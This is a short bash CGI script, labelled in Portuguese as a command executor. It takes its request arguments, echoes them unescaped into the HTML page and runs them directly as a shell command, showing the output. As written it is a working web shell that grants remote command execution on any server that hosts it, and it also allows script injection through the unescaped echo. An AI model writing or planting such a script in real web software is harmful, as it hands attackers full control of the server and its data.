#!/bin/bash

echo "Content-type: text/html"
echo 

echo "<h1>Executor de comando: $*</h1>"
echo "<hr>"
echo "<pre>"
$*
echo "</pre>"
